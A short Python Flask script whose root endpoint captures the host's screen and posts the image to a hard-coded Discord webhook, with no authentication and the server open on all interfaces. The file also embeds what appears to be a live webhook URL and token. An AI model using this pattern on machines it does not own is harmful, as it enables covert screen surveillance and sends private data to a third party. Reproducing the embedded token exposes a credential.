from flask import Flask
import pyautogui
import requests

app = Flask(__name__)

# Replace with your actual Discord webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"

@app.route("/")
def take_screenshot():
    try:
        # Take a screenshot
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)

        # Send screenshot to Discord
        with open(screenshot_path, "rb") as file:
            requests.post(WEBHOOK_URL, files={"file": file})

        return "✅ Screenshot sent successfully!", 200
    except Exception as e:
        return f"❌ Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
